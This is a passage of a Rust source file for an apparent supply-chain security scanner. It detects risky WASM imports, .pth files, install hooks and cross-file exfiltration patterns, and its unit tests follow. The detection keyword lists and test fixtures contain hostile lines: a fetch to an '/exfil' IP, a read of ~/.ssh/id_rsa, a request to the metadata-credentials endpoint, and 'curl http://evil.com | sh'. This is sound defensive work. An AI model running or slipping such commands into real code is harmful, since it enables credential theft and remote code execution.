                    wasm_import_severity(&imports)
                } else {
                    Severity::High
                };

                let import_summary = if !imports.is_empty() {
                    format!(
                        " — imports: {}",
                        imports
                            .iter()
                            .map(|(m, n)| format!("{m}.{n}"))
                            .take(5)
                            .collect::<Vec<_>>()
                            .join(", ")
                    )
                } else {
                    String::new()
                };

                findings.push(
                    Finding::new(
                        "DEPSEC-P025",
                        severity,
                        format!(
                            "WebAssembly binary detected: {}{}",
                            path.file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("unknown.wasm"),
                            import_summary
                        ),
                    )
                    .with_file(&rel_path, 0)
                    .with_confidence(Confidence::Medium)
                    .with_suggestion(
                        "WASM binaries in dependencies are unusual — verify this is expected and not a hidden payload",
                    )
                    .with_package(pkg),
                );
            }
        }
    }
}

/// Parse WASM binary imports (module, name) pairs.
/// WASM binary format: magic(4) + version(4) + sections.
/// Import section (id=2) contains module+name+type for each import.
fn parse_wasm_imports(path: &Path) -> Vec<(String, String)> {
    let bytes = match std::fs::read(path) {
        Ok(b) => b,
        Err(_) => return vec![],
    };

    // Validate WASM magic + version
    if bytes.len() < 8 || &bytes[0..4] != b"\0asm" {
        return vec![];
    }

    let mut imports = Vec::new();
    let mut pos = 8; // Skip magic + version

    while pos < bytes.len() {
        let section_id = bytes[pos];
        pos += 1;

        let (section_size, bytes_read) = read_leb128(&bytes[pos..]);
        pos += bytes_read;

        if section_id == 2 {
            // Import section
            let section_end = pos + section_size as usize;
            let (num_imports, bytes_read) = read_leb128(&bytes[pos..]);
            pos += bytes_read;

            for _ in 0..num_imports {
                if pos >= section_end {
                    break;
                }
                // module name
                let (mod_len, br) = read_leb128(&bytes[pos..]);
                pos += br;
                let mod_name = std::str::from_utf8(&bytes[pos..pos + mod_len as usize])
                    .unwrap_or("")
                    .to_string();
                pos += mod_len as usize;

                // import name
                let (name_len, br) = read_leb128(&bytes[pos..]);
                pos += br;
                let import_name = std::str::from_utf8(&bytes[pos..pos + name_len as usize])
                    .unwrap_or("")
                    .to_string();
                pos += name_len as usize;

                // import type (1 byte kind + varying payload) — skip it
                if pos < section_end {
                    let kind = bytes[pos];
                    pos += 1;
                    match kind {
                        0x00 => {
                            let (_, br) = read_leb128(&bytes[pos..]);
                            pos += br;
                        } // func
                        0x01 => pos += 4, // table: element_type(1) + limits(1+leb+leb)
                        0x02 => {
                            // memory: limits
                            let flags = bytes.get(pos).copied().unwrap_or(0);
                            pos += 1;
                            let (_, br) = read_leb128(&bytes[pos..]);
                            pos += br;
                            if flags & 1 != 0 {
                                let (_, br) = read_leb128(&bytes[pos..]);
                                pos += br;
                            }
                        }
                        0x03 => pos += 2, // global: valtype(1) + mut(1)
                        _ => break,       // Unknown — stop parsing
                    }
                }

                if !mod_name.is_empty() && !import_name.is_empty() {
                    imports.push((mod_name, import_name));
                }
            }
            break; // Found import section — done
        }

        // Skip this section
        pos += section_size as usize;
    }

    imports
}

/// Read a LEB128 unsigned integer. Returns (value, bytes_consumed).
fn read_leb128(bytes: &[u8]) -> (u64, usize) {
    let mut result: u64 = 0;
    let mut shift = 0;
    for (i, &byte) in bytes.iter().enumerate() {
        result |= ((byte & 0x7f) as u64) << shift;
        if byte & 0x80 == 0 {
            return (result, i + 1);
        }
        shift += 7;
        if shift >= 64 {
            return (result, i + 1);
        }
    }
    (result, bytes.len())
}

/// High-risk WASM import patterns
const WASM_DANGEROUS_IMPORTS: &[&str] = &[
    "fd_write",
    "fd_read",
    "sock_open",
    "sock_send",
    "sock_recv",
    "environ_get",
    "environ_sizes_get",
    "proc_exit",
    "path_open",
    "args_get",
];

/// Assess severity based on WASM imports.
/// Network + filesystem = Critical, filesystem alone = High, other = Medium
fn wasm_import_severity(imports: &[(String, String)]) -> Severity {
    let has_network = imports
        .iter()
        .any(|(_, n)| n.contains("sock_") || n.contains("http"));
    let has_fs = imports
        .iter()
        .any(|(_, n)| n.contains("fd_") || n.contains("path_open"));
    let has_env = imports.iter().any(|(_, n)| n.contains("environ"));
    let has_dangerous = imports
        .iter()
        .any(|(_, n)| WASM_DANGEROUS_IMPORTS.contains(&n.as_str()));

    if has_network && (has_fs || has_env) {
        Severity::Critical
    } else if has_dangerous {
        Severity::High
    } else {
        Severity::Medium
    }
}

/// DEPSEC-P009: Scan Python site-packages for .pth files with executable code
fn check_pth_files(root: &Path, findings: &mut Vec<Finding>) {
    let pth_dangerous = [
        "subprocess",
        "exec(",
        "eval(",
        "base64",
        "import os",
        "import sys",
    ];
    let search_dirs = [".venv", "venv", "site-packages"];

    for dir_name in &search_dirs {
        let dir = root.join(dir_name);
        if !dir.exists() {
            continue;
        }

        for entry in WalkDir::new(&dir)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let path = entry.path();
            let ext = path.extension().and_then(|e| e.to_str());
            if ext != Some("pth") {
                continue;
            }

            let content = match std::fs::read_to_string(path) {
                Ok(c) => c,
                Err(_) => continue,
            };

            for keyword in &pth_dangerous {
                if content.contains(keyword) {
                    let rel_path = path
                        .strip_prefix(root)
                        .unwrap_or(path)
                        .to_string_lossy()
                        .to_string();
                    findings.push(
                        Finding::new("DEPSEC-P009", Severity::Critical, format!(".pth file with executable code: contains '{keyword}'"))
                            .with_file_only(rel_path)
                            .with_confidence(Confidence::High)
                            .with_suggestion("Remove immediately — .pth files with executable code are almost always malicious"),
                    );
                    break; // One finding per file is enough
                }
            }
        }
    }
}

/// DEPSEC-P012: Check package.json install scripts for remote code execution
fn check_install_scripts(root: &Path, findings: &mut Vec<Finding>) {
    let package_json = root.join("package.json");
    if !package_json.exists() {
        return;
    }

    let content = match std::fs::read_to_string(&package_json) {
        Ok(c) => c,
        Err(_) => return,
    };

    let parsed: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return,
    };

    let scripts = match parsed.get("scripts").and_then(|s| s.as_object()) {
        Some(s) => s,
        None => return,
    };

    let dangerous_hooks = ["preinstall", "postinstall", "install", "prepare"];
    let safe_scripts = [
        "husky install",
        "husky",
        "patch-package",
        "node-gyp rebuild",
        "node-gyp",
        "tsc",
        "esbuild",
        "ngcc",
    ];
    let suspicious_patterns = Regex::new(
        r"(?i)(curl|wget|fetch\s*\(|https?\.get|node\s+\S+\.js|python|bash|sh\s+-c|powershell|eval|exec\s*\()",
    )
    .unwrap();

    for hook in &dangerous_hooks {
        if let Some(script_value) = scripts.get(*hook).and_then(|s| s.as_str()) {
            // Skip known-safe scripts
            if safe_scripts
                .iter()
                .any(|safe| script_value.starts_with(safe))
            {
                continue;
            }

            if suspicious_patterns.is_match(script_value) {
                findings.push(
                    Finding::new(
                        "DEPSEC-P012",
                        Severity::High,
                        format!(
                            "Install script '{}' executes suspicious command: {}",
                            hook,
                            truncate_line(script_value, 60)
                        ),
                    )
                    .with_file_only("package.json")
                    .with_confidence(Confidence::High)
                    .with_suggestion(format!(
                        "Review the '{hook}' script — install scripts are a common attack vector"
                    )),
                );
            }
        }
    }
}

/// DEPSEC-P016: Scan dependency package.json files for install scripts
/// These are the #1 entry vector for supply chain attacks (postinstall hooks).
fn check_dep_install_scripts(root: &Path, findings: &mut Vec<Finding>) {
    let nm_dir = root.join("node_modules");
    if !nm_dir.exists() {
        return;
    }

    let dangerous_hooks = ["preinstall", "postinstall", "install"];
    let safe_scripts: &[&str] = &[
        "husky install",
        "husky",
        "patch-package",
        "node-gyp rebuild",
        "node-gyp",
        "tsc",
        "esbuild",
        "ngcc",
        "prisma generate",
        "nuxt prepare",
        "npx only-allow",
        "is-ci",
        "opencollective",
        "node install",
        "prebuild-install",
    ];

    // Scan top-level and scoped packages
    let entries = match std::fs::read_dir(&nm_dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if path
            .file_name()
            .and_then(|n| n.to_str())
            .is_some_and(|n| n.starts_with('.'))
        {
            continue;
        }

        if path.is_dir() {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if name.starts_with('@') {
                // Scoped package — scan children
                if let Ok(scoped) = std::fs::read_dir(&path) {
                    for sub in scoped.flatten() {
                        let sub_path = sub.path();
                        if sub_path.is_dir() {
                            check_single_dep_package_json(
                                root,
                                &sub_path,
                                &dangerous_hooks,
                                safe_scripts,
                                findings,
                            );
                        }
                    }
                }
            } else {
                check_single_dep_package_json(
                    root,
                    &path,
                    &dangerous_hooks,
                    safe_scripts,
                    findings,
                );
            }
        }
    }
}

fn check_single_dep_package_json(
    root: &Path,
    pkg_dir: &Path,
    dangerous_hooks: &[&str],
    safe_scripts: &[&str],
    findings: &mut Vec<Finding>,
) {
    let pkg_json = pkg_dir.join("package.json");
    if !pkg_json.exists() {
        return;
    }

    let content = match std::fs::read_to_string(&pkg_json) {
        Ok(c) => c,
        Err(_) => return,
    };

    let parsed: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return,
    };

    let scripts = match parsed.get("scripts").and_then(|s| s.as_object()) {
        Some(s) => s,
        None => return,
    };

    let rel_path = pkg_json
        .strip_prefix(root)
        .unwrap_or(&pkg_json)
        .to_string_lossy()
        .to_string();
    let pkg_name = extract_package_name(&rel_path);

    for hook in dangerous_hooks {
        if let Some(script_value) = scripts.get(*hook).and_then(|s| s.as_str()) {
            if safe_scripts
                .iter()
                .any(|safe| script_value.starts_with(safe))
            {
                continue;
            }

            findings.push(
                Finding::new(
                    "DEPSEC-P016",
                    Severity::High,
                    format!(
                        "Dependency has '{}' script: {}",
                        hook,
                        truncate_line(script_value, 60)
                    ),
                )
                .with_file_only(rel_path.clone())
                .with_confidence(Confidence::High)
                .with_suggestion(format!(
                    "Review the '{hook}' script — install hooks in dependencies are a common attack vector"
                ))
                .with_package(pkg_name.clone()),
            );
        }
    }
}

/// DEPSEC-P002 cross-line enhancement: detect base64 decode + exec/require in the same file
/// but on different lines. Weaker signal than same-line (Medium confidence).
fn check_cross_line_decode_exec(content: &str, file: &str, findings: &mut Vec<Finding>) {
    let has_decode = content.contains("atob(")
        || content.contains("atob (")
        || (content.contains("Buffer.from(") && content.contains("base64"));

    if !has_decode {
        return;
    }

    let has_exec = content.contains("require(")
        || content.contains("eval(")
        || content.contains("exec(")
        || content.contains("execSync(")
        || content.contains("spawn(")
        || content.contains("new Function(");

    if has_exec {
        findings.push(
            Finding::new(
                "DEPSEC-P002",
                Severity::High,
                "base64 decode and code execution in same file (cross-line pattern)".to_string(),
            )
            .with_file_only(file.to_string())
            .with_confidence(Confidence::Medium)
            .with_suggestion(
                "Investigate immediately — base64-to-exec across functions is a common malware obfuscation pattern",
            )
            .with_package(extract_package_name(file)),
        );
    }
}

/// Signal combination: escalate findings when multiple weak signals co-occur in the same file.
/// e.g., dynamic require + obfuscation = definitely malicious.
fn apply_signal_combination(findings: &mut Vec<Finding>) {
    use std::collections::{HashMap, HashSet};

    // Group rule IDs by file AND by package
    let mut rules_by_file: HashMap<String, HashSet<String>> = HashMap::new();
    let mut rules_by_package: HashMap<String, HashSet<String>> = HashMap::new();
    for f in findings.iter() {
        if let Some(file) = &f.file {
            rules_by_file
                .entry(file.clone())
                .or_default()
                .insert(f.rule_id.clone());
        }
        if let Some(pkg) = &f.package {
            rules_by_package
                .entry(pkg.clone())
                .or_default()
                .insert(f.rule_id.clone());
        }
    }

    // File-level escalation rules (existing)
    for (file, rules) in &rules_by_file {
        let has_dynamic_require = rules.contains("DEPSEC-P013");
        let has_obfuscation = rules.contains("DEPSEC-P014")
            || rules.contains("DEPSEC-P017")
            || rules.contains("DEPSEC-P007");
        let has_anti_forensic = rules.contains("DEPSEC-P015");

        // Dynamic require + any obfuscation → escalate P013 to Critical
        if has_dynamic_require && (has_obfuscation || has_anti_forensic) {
            for f in findings.iter_mut() {
                if f.file.as_deref() == Some(file) && f.rule_id == "DEPSEC-P013" {
                    f.severity = Severity::Critical;
                    f.message = format!(
                        "{} [ESCALATED: combined with obfuscation signals]",
                        f.message
                    );
                }
            }
        }

        // Anti-forensic + any exec/require signal → escalate P015
        if has_anti_forensic && (has_dynamic_require || rules.contains("DEPSEC-P001")) {
            for f in findings.iter_mut() {
                if f.file.as_deref() == Some(file) && f.rule_id == "DEPSEC-P015" {
                    f.message = format!("{} [ESCALATED: combined with code execution]", f.message);
                }
            }
        }
    }

    // Package-level cross-file escalation (new)
    // Detects attack patterns split across multiple files within a package
    let mut new_findings = Vec::new();
    for (pkg, rules) in &rules_by_package {
        let has_credential = rules.contains("DEPSEC-P004");
        let has_network = rules.contains("DEPSEC-P003")
            || rules.contains("DEPSEC-P006")
            || rules.contains("DEPSEC-P010")
            || rules.contains("DEPSEC-P011");
        let has_exec = rules.contains("DEPSEC-P001") || rules.contains("DEPSEC-P008");
        let has_obfuscation = rules.contains("DEPSEC-P014")
            || rules.contains("DEPSEC-P017")
            || rules.contains("DEPSEC-P007");
        let has_dynamic = rules.contains("DEPSEC-P013");

        // Cross-file exfiltration: credential read + network call in different files
        if has_credential && (has_network || has_exec) {
            // Only fire if signals are in DIFFERENT files (same-file already handled by file-level rules)
            let cred_files: HashSet<_> = findings
                .iter()
                .filter(|f| f.package.as_deref() == Some(pkg) && f.rule_id == "DEPSEC-P004")
                .filter_map(|f| f.file.clone())
                .collect();
            let net_files: HashSet<_> = findings
                .iter()
                .filter(|f| {
                    f.package.as_deref() == Some(pkg)
                        && (f.rule_id == "DEPSEC-P003"
                            || f.rule_id == "DEPSEC-P006"
                            || f.rule_id == "DEPSEC-P001")
                })
                .filter_map(|f| f.file.clone())
                .collect();

            if cred_files.intersection(&net_files).next().is_none() && !net_files.is_empty() {
                new_findings.push(
                    Finding::new(
                        "DEPSEC-COMBO-001",
                        Severity::Critical,
                        format!(
                            "Cross-file exfiltration pattern: credential read + network/exec in separate files within {pkg}"
                        ),
                    )
                    .with_confidence(Confidence::High)
                    .with_suggestion(
                        "This package reads credentials in one file and has network/exec capability in another — likely data exfiltration",
                    )
                    .with_package(Some(pkg.clone())),
                );
            }
        }

        // Cross-file dropper: code execution + obfuscation in different files
        if has_exec && has_obfuscation {
            new_findings.push(
                Finding::new(
                    "DEPSEC-COMBO-002",
                    Severity::Critical,
                    format!(
                        "Cross-file dropper pattern: code execution + obfuscation in separate files within {pkg}"
                    ),
                )
                .with_confidence(Confidence::Medium)
                .with_suggestion(
                    "This package has obfuscated code in one file and shell/code execution in another — review manually",
                )
                .with_package(Some(pkg.clone())),
            );
        }

        // Cross-file dynamic loader: dynamic require + obfuscation across files
        if has_dynamic && has_obfuscation {
            new_findings.push(
                Finding::new(
                    "DEPSEC-COMBO-003",
                    Severity::High,
                    format!(
                        "Cross-file obfuscated loader: dynamic require + obfuscation in separate files within {pkg}"
                    ),
                )
                .with_confidence(Confidence::Medium)
                .with_suggestion(
                    "Dynamic module loading combined with obfuscation across files — common in staged malware",
                )
                .with_package(Some(pkg.clone())),
            );
        }
    }

    findings.extend(new_findings);
}

fn truncate_line(line: &str, max: usize) -> String {
    let trimmed = line.trim();
    if trimmed.len() <= max {
        trimmed.to_string()
    } else {
        // Safe UTF-8 boundary slicing
        let truncated: String = trimmed.chars().take(max).collect();
        format!("{truncated}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shannon_entropy_uniform() {
        // "aaaa" has 0 entropy
        assert_eq!(shannon_entropy("aaaa"), 0.0);
    }

    #[test]
    fn test_shannon_entropy_mixed() {
        let entropy = shannon_entropy("abcdefghijklmnopqrstuvwxyz");
        assert!(entropy > 4.0);
    }

    #[test]
    fn test_is_binary_ext() {
        assert!(is_binary_ext(Path::new("file.png")));
        assert!(is_binary_ext(Path::new("file.wasm")));
        assert!(!is_binary_ext(Path::new("file.js")));
        assert!(!is_binary_ext(Path::new("file.py")));
    }

    #[test]
    fn test_truncate_line() {
        assert_eq!(truncate_line("short", 80), "short");
        let long = "a".repeat(100);
        let truncated = truncate_line(&long, 80);
        assert!(truncated.ends_with("..."));
        assert!(truncated.len() <= 83); // 80 + "..."
    }

    #[test]
    fn test_pattern_rules_compile() {
        // Verify all pattern regexes compile
        for rule in PATTERN_RULES {
            assert!(
                Regex::new(rule.pattern).is_ok(),
                "Pattern {} failed to compile: {}",
                rule.rule_id,
                rule.pattern
            );
        }
    }

    #[test]
    fn test_is_skip_ext() {
        assert!(is_skip_ext(Path::new("devalue.js.map")));
        assert!(is_skip_ext(Path::new("types.d.ts")));
        assert!(is_skip_ext(Path::new("module.d.mts")));
        assert!(is_skip_ext(Path::new("cjs.d.cts")));
        assert!(!is_skip_ext(Path::new("index.js")));
        assert!(!is_skip_ext(Path::new("utils.ts")));
        assert!(!is_skip_ext(Path::new("main.py")));
    }

    #[test]
    fn test_should_skip_dir() {
        assert!(should_skip_dir(".vite"));
        // test/tests/spec are NOT skipped (security: malicious packages hide payloads there)
        assert!(!should_skip_dir("test"));
        assert!(!should_skip_dir("tests"));
        assert!(!should_skip_dir("spec"));
        assert!(!should_skip_dir("src"));
        assert!(!should_skip_dir("lib"));
        assert!(!should_skip_dir("dist"));
    }

    #[test]
    fn test_is_skip_filename() {
        assert!(is_skip_filename(Path::new("README.md")));
        assert!(is_skip_filename(Path::new("CHANGELOG.md")));
        assert!(is_skip_filename(Path::new("LICENSE")));
        assert!(!is_skip_filename(Path::new("index.js")));
        assert!(!is_skip_filename(Path::new("package.json")));
    }

    #[test]
    fn test_extract_package_name_npm() {
        assert_eq!(
            extract_package_name("node_modules/lodash/index.js"),
            Some("lodash".into())
        );
    }

    #[test]
    fn test_extract_package_name_scoped() {
        assert_eq!(
            extract_package_name("node_modules/@sveltejs/kit/src/lib.js"),
            Some("@sveltejs/kit".into())
        );
    }

    #[test]
    fn test_extract_package_name_nested() {
        // Should return innermost package
        assert_eq!(
            extract_package_name("node_modules/pkg-a/node_modules/pkg-b/lib/evil.js"),
            Some("pkg-b".into())
        );
    }

    #[test]
    fn test_extract_package_name_vendor_gems() {
        assert_eq!(
            extract_package_name("vendor/bundle/ruby/3.2.0/gems/rails-7.1.0/lib/active.rb"),
            Some("rails-7.1.0".into())
        );
    }

    #[test]
    fn test_extract_package_name_venv() {
        assert_eq!(
            extract_package_name(".venv/lib/python3.11/site-packages/requests/api.py"),
            Some("requests".into())
        );
    }

    #[test]
    fn test_extract_package_name_unknown() {
        assert_eq!(extract_package_name("src/main.rs"), None);
    }

    use crate::config::Config;

    fn setup_dep_file(content: &str) -> (tempfile::TempDir, Config) {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/test-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("index.js"), content).unwrap();
        (dir, Config::default())
    }

    #[test]
    fn test_scan_detects_eval_exec() {
        // P002: base64 decode → execute chain
        let (dir, config) = setup_dep_file("var x = atob(data); eval(x);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P002"),
            "Expected P002 finding, got: {:?}",
            result
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_scan_detects_raw_ip() {
        let (dir, config) = setup_dep_file("fetch('http://83.142.209.203:8080/exfil');");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P003"));
    }

    #[test]
    fn test_scan_detects_credential_harvest() {
        // P004: readFile targeting ~/.ssh
        let (dir, config) = setup_dep_file("readFile('~/.ssh/id_rsa');");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P004"),
            "Expected P004, got: {:?}",
            result
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_scan_detects_imds() {
        let (dir, config) = setup_dep_file(
            "curl('http://169.254.169.254/latest/meta-data/iam/security-credentials/');",
        );
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P010"));
    }

    #[test]
    fn test_scan_detects_env_exfil() {
        let (dir, config) = setup_dep_file("JSON.stringify(process.env);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P011"));
    }

    #[test]
    fn test_scan_clean_file_no_findings() {
        let (dir, config) = setup_dep_file("module.exports = function() { return 42; };");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_scan_respects_ignore_rules() {
        let (dir, mut config) = setup_dep_file("fetch('http://83.142.209.203/exfil');");
        config.ignore.patterns = vec!["DEPSEC-P003".into()];
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(!result.findings.iter().any(|f| f.rule_id == "DEPSEC-P003"));
    }

    #[test]
    fn test_scan_respects_allow_rules() {
        let (dir, mut config) =
            setup_dep_file("const cp = require('child_process');\ncp.exec(cmd);");
        config
            .patterns
            .allow
            .insert("test-pkg".into(), vec!["DEPSEC-P001".into()]);
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(!result
            .findings
            .iter()
            .any(|f| f.rule_id == "DEPSEC-P001" && f.package.as_deref() == Some("test-pkg")));
    }

    #[test]
    fn test_scan_no_dep_dirs() {
        let dir = tempfile::TempDir::new().unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(result.findings.is_empty());
        assert!(result
            .pass_messages
            .iter()
            .any(|m| m.contains("No dependency directories")));
    }

    #[test]
    fn test_scan_skips_binary_files() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/img-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("icon.png"), "fake png with eval(bad)").unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        // PNG files should be skipped entirely
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_scan_skips_source_maps() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/map-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("bundle.js.map"), "eval(bad)").unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_is_install_script() {
        assert!(is_install_script(Path::new("postinstall.sh"), "curl foo"));
        assert!(is_install_script(Path::new("preinstall.sh"), "wget bar"));
        assert!(!is_install_script(Path::new("index.js"), "curl something"));
    }

    #[test]
    fn test_check_entropy_high() {
        let mut findings = Vec::new();
        // Create a 250+ char high-entropy string
        let long_entropy: String = (0..260).map(|i| (b'a' + (i % 26) as u8) as char).collect();
        let content = format!("var x = \"{long_entropy}\";");
        check_entropy(&content, "node_modules/test/file.js", &mut findings);
        // This string is sequential so might not trigger, but exercises the code
        let _ = findings;
    }

    // --- P013: Dynamic Require integration tests ---

    #[test]
    fn test_scan_detects_dynamic_require_ast() {
        // AST should catch this with High confidence
        let (dir, config) = setup_dep_file("const m = require(decode(stq[0]));");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P013"),
            "Expected P013 finding, got: {:?}",
            result
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
    }

    // --- P014: String Deobfuscation integration tests ---

    #[test]
    fn test_scan_detects_fromcharcode_xor() {
        let (dir, config) = setup_dep_file("var c = String.fromCharCode(s.charCodeAt(0) ^ 333);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P014"),
            "Expected P014 finding for fromCharCode+XOR"
        );
    }

    // --- P015: Anti-Forensic integration tests ---

    #[test]
    fn test_scan_detects_self_deletion() {
        let (dir, config) = setup_dep_file("fs.unlinkSync(__filename);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P015"),
            "Expected P015 finding for self-deletion"
        );
    }

    #[test]
    fn test_scan_detects_package_json_deletion() {
        let (dir, config) = setup_dep_file("unlinkSync('package.json');");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P015"),
            "Expected P015 finding for package.json deletion"
        );
    }

    // --- P017: Obfuscation Indicator integration tests ---

    #[test]
    fn test_scan_detects_hex_function_names() {
        let (dir, config) = setup_dep_file("function _0x3a2f(a, b) { return a + b; }");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P017"),
            "Expected P017 finding for hex function names"
        );
    }

    #[test]
    fn test_scan_detects_while_true_obfuscated() {
        let (dir, config) = setup_dep_file("while (!![]) { break; }");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P017"),
            "Expected P017 finding for while(!![]) pattern"
        );
    }

    #[test]
    fn test_scan_clean_file_no_new_rule_findings() {
        let (dir, config) = setup_dep_file(
            "const fs = require('fs');\nmodule.exports = function() { return 42; };",
        );
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        let new_rules: Vec<_> = result
            .findings
            .iter()
            .filter(|f| {
                f.rule_id == "DEPSEC-P013"
                    || f.rule_id == "DEPSEC-P014"
                    || f.rule_id == "DEPSEC-P015"
                    || f.rule_id == "DEPSEC-P017"
            })
            .collect();
        assert!(
            new_rules.is_empty(),
            "Clean file should have no P013-P017 findings"
        );
    }

    // --- P016: Dependency Install Script tests ---

    #[test]
    fn test_dep_postinstall_flagged() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/evil-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"evil-pkg","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
            "Expected P016 finding for dep postinstall script"
        );
    }

    #[test]
    fn test_dep_safe_script_allowed() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/husky");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"husky","scripts":{"postinstall":"husky install"}}"#,
        )
        .unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            !result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
            "Husky postinstall should be allowed"
        );
    }

    #[test]
    fn test_dep_no_scripts_no_finding() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/safe-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"safe-pkg","version":"1.0.0"}"#,
        )
        .unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            !result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
            "Package without scripts should have no P016 finding"
        );
    }

    #[test]
    fn test_scoped_package_scanned() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/@evil/pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"@evil/pkg","scripts":{"preinstall":"curl http://evil.com | sh"}}"#,
        )
        .unwrap();
        let config = Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
            "Scoped package install scripts should be detected"
        );
    }

    // --- P002 cross-line tests ---

    #[test]
    fn test_cross_line_buffer_require() {
        let (dir, config) = setup_dep_file(
            "var S = Buffer.from(E, \"base64\").toString(\"utf8\");\nvar t = require(decoded);",
        );
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        let p002: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-P002")
            .collect();
        assert!(
            !p002.is_empty(),
